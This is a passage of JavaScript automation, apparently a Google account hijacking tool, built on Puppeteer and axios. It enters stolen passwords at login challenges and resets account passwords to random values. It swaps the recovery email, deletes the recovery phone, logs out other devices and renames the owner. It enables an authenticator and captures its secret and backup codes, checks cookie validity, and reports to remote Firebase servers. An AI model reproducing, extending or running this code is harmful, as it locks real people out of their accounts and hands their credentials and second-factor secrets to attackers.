        return mPassword
    } catch (error) {}

    return mPassword
}

async function waitForRecoveryAdd(page, mRapt, mRecovery) {
    try {
        await page.goto('https://myaccount.google.com/recovery/email?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let hasMail = await page.evaluate(() => {
            let root = document.querySelector('input[type="email"]')
            if (root) {
                return root.value.length > 0
            }
        })

        if (!mRecovery) mRecovery = getRandomUser()+'@oletters.com'

        await page.focus('input[type="email"]')
        if (hasMail) {
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
        }
        await page.keyboard.type(mRecovery)
        await delay(500)
        await page.click('button[type="submit"]')
        await delay(3000)

        return mRecovery
    } catch (error) {}

    return null
}

async function waitForDeviceLogout(page, size) {
    for (let i = 0; i < size; i++) {
        try {
            await page.goto('https://myaccount.google.com/device-activity?hl=en')
            await delay(500)
    
            let mDevice = await page.evaluate(() => {
                let list = document.querySelectorAll('script')
                let year = parseInt(new Date().getFullYear())
                let logout = []
                let years = []
                let data = []
    
                for (let i = 0; i < list.length; i++) {
                    let html = list[i].innerHTML
                    if (html.startsWith('AF_initDataCallback') && !html.includes('mail.google.com') && !html.includes('meet.google.com')) {
                        data = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))[1]
                        break
                    }
                }
    
                for(let i=0; i<data.length; i++) {
                    let child = data[i][2]
                    for(let j=0; j<child.length; j++) {
                        let main = child[j]
                        if(main.length > 9 && main[9]) {
                            years.push(main[9])
                        }
                        if(main.length > 23) {
                            if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
                                logout.push(main[0])
                            }
                        }
                    }
                }
    
                years.sort(function(a, b){return a-b})
    
                if(years.length > 0) {
                    year = parseInt(new Date(years[0]).getFullYear())
                }
    
                if (year < 2000) parseInt(new Date().getFullYear())
    
                return { list:logout, year:year }
            })
    
            console.log('Node: [ Login Devices: '+mDevice.list.length+' --- Time: '+getTime()+' ]')
    
            for (let i = 0; i < mDevice.list.length; i++) {
                try {
                    await page.goto('https://myaccount.google.com/device-activity/id/'+mDevice.list[i]+'?hl=en')
                    await delay(500)
                    await page.click('button[class="VfPpkd-rOvkhd-jPmIDe VfPpkd-rOvkhd-jPmIDe-OWXEXe-ssJRIf"]')
                    await delay(1000)
                    let button = await page.$$('button[class="VfPpkd-LgbsSe ksBjEc lKxP2d LQeN7 SdOXCb LjrPGf HvOprf evJWRb"]')
                    if (button && button.length == 2) {
                        await button[1].click()
                        await delay(2000)
                    }
                } catch (error) {}
            }
    
            return mDevice.year
        } catch (error) {}
    }

    return parseInt(new Date().getFullYear())
}

async function waitForLanguageChange(page) {
    try {
        await page.goto('https://myaccount.google.com/language?hl=en', { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let isEnglish = await page.evaluate(() => {
            let root = document.querySelector('div[class="xsr7od"]')
            if (root) {
                return root.lang.startsWith('en')
            }
            return false
        })

        if (!isEnglish) {
            await page.evaluate(() => {
                return (async () => {
                    try {
                        let body = window.WIZ_global_data.cfb2h
                        let time = window.WIZ_global_data.SNlM0e.replace(':', '%3A')

                        await fetch('https://myaccount.google.com/_/language_update?bl='+body+'&soc-app=1&soc-platform=1&soc-device=1&rt=j', {
                            'headers': {
                            'accept': '*/*',
                            'accept-language': 'en-US,en;q=0.9',
                            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                            'sec-ch-ua': '\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"',
                            'sec-ch-ua-arch': '\"x86\"',
                            'sec-ch-ua-bitness': '\"64\"',
                            'sec-ch-ua-full-version': '\"112.0.5614.0\"',
                            'sec-ch-ua-full-version-list': '\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5614.0\"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-model': '\"\"',
                            'sec-ch-ua-platform': '\"Windows\"',
                            'sec-ch-ua-platform-version': '\"19.0.0\"',
                            'sec-ch-ua-wow64': '?0',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'x-client-data': 'COP7ygE=',
                            'x-same-domain': '1'
                            },
                            'referrer': 'https://myaccount.google.com/language?nlr=1',
                            'referrerPolicy': 'origin-when-cross-origin',
                            'body': 'f.req=%5B%5B%22en%22%5D%5D&at='+time+'&',
                            'method': 'POST',
                            'mode': 'cors',
                            'credentials': 'include'
                        })
                    } catch (error) {}
                    return true
                })()
            })
        }
    } catch (error) {}
}

async function waitForNameChange(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/profile/name/edit?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let mInput = await page.$$('input[type="text"][id]')
        if (mInput.length == 2) {
            let mName = await getName()
            let mSplit = mName.split(' ')
            await mInput[0].focus()
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
            await page.keyboard.type(mSplit[0])
            await delay(500)
            await mInput[1].focus()
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
            await page.keyboard.type(mSplit[1])
            await delay(500)
            if (await exists(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')) {
                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')
            } else if (await exists(page, 'button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')) {
                await page.click('button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')
            }
            await delay(3000)
            console.log('Node: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
            return true
        }
    } catch (error) {}

    console.log('Node: [ Name Change: Failed --- Time: '+getTime()+' ]')
}

async function waitForRemoveRecovery(page, mRapt) {
    try {
        let loadPage = true
        let mRemove = false
        try {
            loadPage = !await page.url().startsWith('https://myaccount.google.com/signinoptions/rescuephone')
        } catch (error) {}

        if (loadPage) {
            await page.goto('https://myaccount.google.com/signinoptions/rescuephone?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
            await delay(500)
        }

        for (let i = 0; i < 10; i++) {
            if (await exists(page, 'div[data-phone]')) {
                try {
                    await waitForSelector(page, 'div[class="N9Ni5"] > div:nth-child(2)')
                    await delay(500)
                    await page.click('div[class="N9Ni5"] > div:nth-child(2)')
                    
                    for (let i = 0; i < 10; i++) {
                        await delay(1000)
                        if (await exists(page, 'div[class="XfpsVe J9fJmf"] > div:nth-child(2)')) {
                            await page.click('div[class="XfpsVe J9fJmf"] > div:nth-child(2)')
                            console.log('Node: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
                            await delay(1000)
                            mRemove = true
                        }
                    }
                } catch (error) {}
            } else if (mRemove) {
                return true
            } else if (await exists(page, 'div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc Zrq4w WIL89 M9Bg4d"]')) {
                console.log('Node: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
                return true
            }

            await delay(1000)
        }
    } catch (error) {}

    console.log('Node: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')

    return false
}

async function waitForAccountDetails(page) {
    await page.goto('https://myaccount.google.com/security?hl=en', { waitUntil: 'load', timeout: 0 })
    await delay(500)

    return await page.evaluate(() => {
        let years = ['2025', '2024', '2023', '2022', '2021', '2020', '2019', '2018', '2017', '2016', '2015', '2014', '2013', '2012', '2011', '2010']
        let root = document.querySelectorAll('a[href*="signinoptions/password"]')
        let gmail = null
        let year = null
        if (root) {
            for (let i = 0; i < root.length; i++) {
                try {
                    let text = root[i].innerText
                    
                    for (let j = 0; j < years.length; j++) {
                        if (text.includes(years[j])) {
                            year = parseInt(years[j])
                            break
                        }
                    }

                    if (year) {
                        break
                    }
                } catch (error) {}
            }
        }

        try {
            let global = window.WIZ_global_data
            if (global && global.oPEP7c) {
                gmail = global.oPEP7c.replace('@gmail.com', '')
            }
        } catch (error) {}

        return { year:year, gmail:gmail }
    })
}

async function waitForRaptToken(page, number, password) {
    let mPassword = null
    let mCodeSend = false
    let mRapt = null

    try {
        let url = await page.url()
        if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
            mRapt = await getRapt(url)

            if (mRapt) {
                return { token:mRapt, password:null }
            }
        }
    } catch (error) {}

    try {
        for (let k = 0; k < 2; k++) {
            await page.goto('https://myaccount.google.com/signinoptions/rescuephone?hl=en', { waitUntil: 'load', timeout: 0 })

            await delay(500)

            let url = await page.url()

            if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                mRapt = await getRapt(url)
            } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                console.log('Node: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
                await page.type('input[type="password"]', password)
                await delay(500)
                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')

                let changePassword = true
                let changeConfirm = true
                let cSelection = true
                let cNumber = true
                mCodeSend = false
                
                for (let load = 0; load < 30; load++) {
                    try {
                        let url = await page.url()

                        if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                            mRapt = await getRapt(url)
                            break
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect')) {
                            break
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') && cSelection) {
                            if (await exists(page, 'div[data-action="selectchallenge"][data-challengetype="13"]')) {
                                console.log('Node: [ Selection Challange: '+number+' --- Time: '+getTime()+' ]')
                                await delay(2000)
                                await page.click('div[data-action="selectchallenge"][data-challengetype="13"]')
                                cSelection = false
                                load = 0
                            } else {
                                break
                            }
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') && cNumber) {
                            if(!number) break
                            if (await exists(page, 'input#phoneNumberId')) {
                                console.log('Node: [ Number Type: '+number+' --- Time: '+getTime()+' ]')
                                await delay(2000)
                                await page.type('input#phoneNumberId', number)
                                await delay(500)
                                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
                                cNumber = false
                                load = 10
                            }
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
                            console.log('Node: [ OTP Send: '+number+' --- Time: '+getTime()+' ]')
                            mCodeSend = true
                            break
                        } else if (url.startsWith('https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform') && changePassword) {
                            try {
                                await waitForSelector(page, 'input[name="Passwd"]')
                                await delay(500)
                                mPassword = getRandomPass()
                                
                                await page.type('input[name="Passwd"]', mPassword)
                                await delay(500)
                                await page.type('input[name="ConfirmPasswd"]', mPassword)
                                await delay(500)
                                await page.click('#changepasswordNext')
                                await delay(1000)
                                changeConfirm = true
                                changePassword = false
                                load = 10
                            } catch (error) {}
                        } else if (mPassword && changeConfirm) {
                            if (await exists(page, 'div[class="VfPpkd-T0kwCb"] > button:nth-child(3)')) {
                                await page.click('div[class="VfPpkd-T0kwCb"] > button:nth-child(3)')
                                await delay(1000)
                                changeConfirm = false
                            }
                        }
                    } catch (error) {}

                    await delay(500)
                }

                if (mCodeSend) {
                    continue
                }
            }

            break
        }
    } catch (error) {}

    return { token:mRapt, password:mPassword }
}

async function waitForTwoFaActive(page, mRapt) {
    let mAuthToken = null
    let mBackupCode = null

    try {
        let url = await page.url()
        if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
            return { auth:null, backup:null, error:true }
        }
        await page.goto('https://myaccount.google.com/two-step-verification/authenticator?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(1000)
        if (await exists(page, 'button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')) {
            await delay(500)
            await page.click('button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')
            await waitForSelector(page, 'button[data-mdc-dialog-action="ok"]')
            await delay(500)
            await page.click('button[data-mdc-dialog-action="ok"]')
            await delay(3000)
        }
        let newButton = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-Bz112c-M1Soyc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe LQeN7 wMI9H"]'
        await waitForSelector(page, newButton)
        await delay(500)
        await page.click(newButton)
        await delay(2000)
        let canSee = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 wMI9H"]'
        await waitForSelector(page, canSee)
        await delay(500)
        await page.click(canSee)
        await delay(1000)
        let authToken = await page.evaluate(() => {
            let root = document.querySelectorAll('strong')
            if (root) {
                for (let i = 0; i < root.length; i++) {
                    try {
                        let split = root[i].innerText.split(' ')
                        if (split.length == 8) {
                            return root[i].innerText
                        }
                    } catch (error) {}
                }
            }
            return null
        })

        if (authToken) {
            await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(2) > button')
            await delay(1000)
            let newToken = twofactor.generateToken(authToken)
            await waitForSelector(page, 'input[type="text"]')
            await delay(500)
            await page.type('input[type="text"]', newToken.token)
            await delay(500)
            await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(3) > button')
            await waitForSelector(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 wMI9H"]')
            mAuthToken = authToken

            console.log('Node: [ Auth Token: Received --- '+getTime()+' ]')
        }
    } catch (error) {}

    try {
        let url = await page.url()
        if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
            return { auth:null, backup:null, error:true }
        }
        await page.goto('https://myaccount.google.com/two-step-verification/backup-codes?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let newButton = 'div[class="xIcqYe"] > div > div >button'
        for (let i = 0; i < 30; i++) {
            try {
                if (await exists(page, 'div[class="kvjuQc biRLo"] > div:nth-child(2)')) {
                    await delay(500)
                    await page.click('div[class="kvjuQc biRLo"] > div:nth-child(2)')
                    await waitForSelector(page, 'button[data-mdc-dialog-action="ok"]')
                    await delay(500)
                    await page.click('button[data-mdc-dialog-action="ok"]')
                    await delay(3000)
                    await waitForSelector(page, newButton)
                    break
                } else if (await exists(page, newButton)) {
                    break
                }
            } catch (error) {}

            await delay(500)
        }
        await delay(500)
        await page.click(newButton)

        for (let i = 0; i < 30; i++) {
            try {
                let response = await page.waitForResponse(async res => res)
                try {
                    let url = await response.url()
                    if (url.startsWith('https://myaccount.google.com/_/AccountSettingsStrongauthUi/data/batchexecute') && url.includes('two-step-verification')) {
                        let text = await response.text()
                        if (text.includes('"[[')) {
                            let temp = text.substring(text.indexOf('"[[')+2, text.length)
                            let list = JSON.parse(temp.substring(0, temp.indexOf(']')+1).replace(/[\\]/g, ''))
                            let code = ''
                            for (let i = 0; i < list.length; i++) {
                                code += list[i]+' '
                            }
                            mBackupCode = code.trim()
                            console.log('Node: [ Backup Code: Received --- '+getTime()+' ]')
                            break
                        }
                    }
                } catch (error) {}
            } catch (error) {
                break
            }
        }
    } catch (error) {}

    try {
        if (mBackupCode || mAuthToken) {
            for (let i = 0; i < 3; i++) {
                try {
                    let url = await page.url()
                    if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
                        return { auth:null, backup:null, error:true }
                    }
                    await page.goto('https://myaccount.google.com/signinoptions/twosv?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
                    await delay(500)
                    await waitForSelector(page, 'div[class="xIcqYe"] > div > div > button', 5)
                    await delay(500)
                    await page.click('div[class="xIcqYe"] > div > div > button')
                    await waitForSelector(page, 'button[data-mdc-dialog-action="d7k1Xe"]', 5)
                    await delay(500)
                    await page.click('button[data-mdc-dialog-action="d7k1Xe"]')
                    await waitForSelector(page, 'button[data-mdc-dialog-action="TYajJe"]', 5)
                    await delay(500)
                    await page.click('button[data-mdc-dialog-action="TYajJe"]')
    
                    try {
                        await page.waitForResponse(async res => res)
                    } catch (error) {}
    
                    for (let i = 0; i < 20; i++) {
                        try {
                            if (await exists(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe P62QJc LQeN7 wMI9H"]')) {
                                break
                            } else if (await exists(page, 'div[class="VfPpkd-T0kwCb"]')) {
                                if (!await exists(page, 'div[class="VfPpkd-T0kwCb"] > button')) {
                                    break
                                }
                            }
                        } catch (error) {}
                    }
    
                    await delay(1500)
    
                    return { auth:mAuthToken, backup:mBackupCode, error:false }
                } catch (error) {}
            }

            return { auth:mAuthToken, backup:mBackupCode, error:true }
        }
    } catch (error) {}

    return { auth:null, backup:null, error:true }
}

async function waitForSkipPassworp(page, mRapt) {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://myaccount.google.com/signinoptions/passwordoptional?hl=en&rapt='+mRapt)
            await delay(500)
    
            let isChecked = await page.evaluate(() => {
                let root = document.querySelector('button[type="button"]')
                if (root) {
                    let checked = root.getAttribute('aria-checked')
                    return checked == 'true' || checked == true
                }
            })
    
            if (isChecked) {
                await page.click('button[type="button"]')
                await delay(1500)
            }

            break
        } catch (e) {}
    }
}

async function isValidCookies(cookies) {
    try {
        let response = await axios.get('https://myaccount.google.com/phone', {
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'cookie': cookies,
                'priority': 'u=0, i',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-form-factors': '"Desktop"',
                'sec-ch-ua-full-version': '"131.0.6778.265"',
                'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.265", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-ch-ua-wow64': '?0',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            },
            validateStatus: null,
            maxRedirects: 0
        })

        let location = response.headers['location']

        if (location) {
            return false
        } else {
            return true
        }
    } catch (error) {}

    return false
}

async function getMailTokenData(url) {
    if (!url) url = 'https://accounts.google.com/ServiceLogin?service=mail&passive=1209600&osid=1&continue=https://mail.google.com/mail/u/0/&followup=https://mail.google.com/mail/u/0/&emr=1&authuser=0'

    try {
        let response = await axios.get(url, {
            headers: getMailHeaders(mMailCookies),
            validateStatus:null,
            maxRedirects:0
        })

        await putCookies(response.headers['set-cookie'])

        let location = response.headers.location
        
        if (location) {
            return await getMailTokenData(location)
        } else {
            try {
                let data = response.data
                let split = data.split('_GM_setData({')
                for (let i = 0; i < split.length; i++) {
                    try {
                        let json = JSON.parse('{'+split[i].substring(0, split[i].indexOf('});')+1))
                        let details = json['w43KIf']
                        return { token:details[1], key:details[2] }
                    } catch (error) {}
                }
            } catch (error) {}
        }
    } catch (error) {}

    return null
}

async function getMailYear(data) {
    if (data) {
        try {
            let response = await axios.get('https://mail.google.com/mail/u/0/data?token=%5B%22cftp%22,%22'+data.key+'%22,null,null,null,3,%22%22%5D', {
                headers: getMailHeaders(mMailCookies),
                validateStatus:null,
                maxRedirects:0
            })

            await putCookies(response.headers['set-cookie'])

            let mTotal = 0
            let html = response.data
            
            let split = html.split('_GM_setData({')
            for (let i = 0; i < split.length; i++) {
                try {
                    let json = JSON.parse('{'+split[i].substring(0, split[i].indexOf('});')+1))
                    let all = json['hqyl8']
                    if (all) {
                        let json = JSON.parse(all)
                        let temp = json[3][0]
                        for (let j = 0; j < temp.length; j++) {
                            let _all = temp[j].toString()
                            if (_all.includes('^all')) {
                                mTotal = temp[j][2]
                                break
                            }
                        }
                        if (mTotal > 0) {
                            break
                        }
                    }
                } catch (error) {}
            }

            if (mTotal > 0) {
                let page = (Math.ceil(mTotal/50)-1)
                for (let i = 0; i < 2; i++) {
                    try {
                        let response = await axios.post('https://mail.google.com/sync/u/0/i/bv?hl=en&c=0&rt=r&pt=ji',[[57,50,null,"in:^all",[null,null,null,null,0],null,1,2000,null,page,null,null,null,1,null,null,null,null,0,1],null,[0,5,null,null,1,1,1]], {
                            headers: getInboxHeaders(mMailCookies, data.key, data.token),
                            validateStatus:null,
                            maxRedirects:0
                        })

                        await putCookies(response.headers['set-cookie'])
        
                        let list = response.data[2]
                        if(list && list.length > 0) {
                            let date = list[list.length-1][0][2]
                            return new Date(date).getFullYear()
                        }
                    } catch (error) {}

                    if (page > 0) page--
                }
            }
        } catch (error) {}
    }

    return new Date().getFullYear()
}

async function getMailCookie(cookie) {
    let split = cookie.split(';')
    let cookies = {}

    for (let i = 0; i < split.length; i++) {
        try {
            let single = split[i].trim().split('=')
            if (single.length == 2) {
                cookies[single[0]] = single[1]
            }
        } catch (error) {}
    }

    return cookies
}

async function getNewCookies(cookies) {
    let cookie = ''

    for (let i = 0; i < cookies.length; i++) {
        try {
            cookie += cookies[i]['name']+'='+cookies[i]['value']+(i == cookies.length-1 ? '' : '; ')
        } catch (error) {}
    }

    return cookie
}

async function putCookies(data) {
    if (data) {
        for (let i = 0; i < data.length; i++) {
            try {
                let line = data[i].substring(0, data[i].indexOf(';'))
                if (line.startsWith('NID')) {
                    mMailCookies['NID'] = line.substring(4, line.length)
                } else {
                    let split = line.split('=')
                    mMailCookies[split[0]] = split[1]
                }
            } catch (error) {}
        }
    }
    
}

function getMailHeaders(cookies) {
    let cookie = ''
    for (let [key, value] of Object.entries(cookies)) {
        cookie += key+'='+value+'; '
    }
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'cookie': cookie,
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2025 Google LLC. All rights reserved.',
        'x-browser-year': '2025',
    }
}

function getInboxHeaders(cookies, key, xToken) {
    let cookie = ''
    for (let [key, value] of Object.entries(cookies)) {
        cookie += key+'='+value+'; '
    }

    let time = new Date().getTime()
    
    return {
        'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.160", "Google Chrome";v="132.0.6834.160"',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',       
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-form-factors': '"Desktop"',
        'sec-ch-ua-wow64': '?0',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-full-version': '"132.0.6834.160"',
        'content-type': 'application/json',
        'x-gmail-btai': '[null,null,[null,null,null,null,null,null,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,"en","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,null,0,null,1,0,1,1,null,0,0,null,null,null,1,100,1,1,0,1,0,null,0,1,1,1,1,null,null,0,null,1,0,1,0,0,0,0,0],null,"'+key+'",null,25,"gmail.pinto-server_20250202.07_p0",1,5,"",21600000,"+06:00",null,null,722398589,"","",'+time+']',
        'x-framework-xsrf-token': xToken,
        'referer': 'https://mail.google.com/mail/u/0/',
        'x-google-btd': '1',
        'x-gmail-storage-request': '',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'sec-ch-ua-platform-version': '"19.0.0"',
        'accept': '*/*',
        'cookie': cookie,
        'origin': 'https://mail.google.com'
    }
}

async function getName() {
    for (let i = 0; i < 3; i++) {
        try {
            let response = await axios.get('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/name/english/male/'+getRandomInt(0, 94929)+'.json')
            if (response.data) {
                return response.data
            }
        } catch (error) {}
    }
}

async function getRapt(url) {
    try {
        if (url.includes('rapt=')) {
            let temp = url.substring(url.indexOf('rapt=')+5, url.length)

            if (temp.includes('&')) {
                return temp.substring(0, temp.indexOf('&'))
            } else {
                return temp
            }
        }
    } catch (error) {}

    return null
}

async function waitForSelector(page, element, _timeout = 30) {

    for (let i = 0; i < _timeout; i++) {
        try {
            let data = await exists(page, element)
            if (data) {
                break
            }
        } catch (error) {}

        await delay(500)
    }
}

async function exists(page, element) {
    return await page.evaluate((element) => {
        let root = document.querySelector(element)
        if (root) {
            return true
        }
        return false
    }, element)
}

async function getNumber() {
    try {
        if (mList.length == 0) {
            mList = JSON.parse(fs.readFileSync('number.json'))
        }
    } catch (error) {}

    if (mList.length > 0) {
        if (SIZE >= mList.length) {
            mList = []
            TIME = null
        } else {
            return mList[SIZE]
        }
    }

    try {
        if (mList.length == 0 && TIME == null) {
            let response = await axios.get(BASE_URL+'collect/'+COUNTRY+'.json?orderBy="$key"&limitToFirst=20&print=pretty')
            let list = []

            for (let key of Object.keys(response.data)) {
                list.push(key)
            }

            let name = list[Math.floor((Math.random() * list.length))]
            
            try {
                await axios.delete(BASE_URL+'collect/'+COUNTRY+'/'+name+'.json')
            } catch (error) {}
            
            try {
                await axios.patch(BASE_URL+'server/'+USER+'.json', JSON.stringify({ time:name, size:0 }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {}

            TIME = name
        }
    } catch (error) {}

    try {
        if (TIME) {
            let response = await axios.get(BASE_URL+'number/'+COUNTRY+'/'+TIME+'.json')
            let data = response.data

            if (data) {
                let output = []

                for (let value of Object.values(data)) {
                    if (value != null) {
                        output.push(value)
                    }
                }
    
                mList = output
    
                fs.writeFileSync('number.json', JSON.stringify(output))   
            } else {
                TIME = null
                console.log('----NUMBER-ERROR----')
                return await getNumber()
            }
        }
    } catch (error) {
        TIME = null
        console.log('----NUMBER-ERROR----')
        return await getNumber()
    }

    if (mList.length > 0 && mList.length < SIZE) {
        return mList[SIZE]
    }

    await delay(30000)
    console.log('----NUMBER-ERROR----')

    return await getNumber()
}

async function checkStatus() {
    if (FINISH > 0 && FINISH < new Date().getTime() && !mWorkerActive) {
        await saveSize(true)

        try {
            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
                'Content-Type':'active/'+parseInt(new Date().getTime()/1000)
            })
        } catch (error) {}

        console.log('---COMPLETED---')
        process.exit(0)
    } else {
        try {
            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+200)
            })
        } catch (error) {}
    }
}

async function postAxios(url, body, data) {
    return new Promise((resolve) => {
        try {
            fetch(url, {
                method: 'POST',
                headers: data,
                body: body
            }).then((response) => {
                resolve('ok')
            }).catch((error) => {
                resolve('ok')
            })
        } catch (error) {
            resolve('ok')
        }
    })
}

function getRandomUser() {
    let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
    let user = ''

    for (let i = 0; i < 10; i++) {
        user += L[Math.floor((Math.random() * L.length))]
    }

    for (let i = 0; i < 5; i++) {
        user += N[Math.floor((Math.random() * N.length))]
    }

    return user
}

function getRandomPass() {
    let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
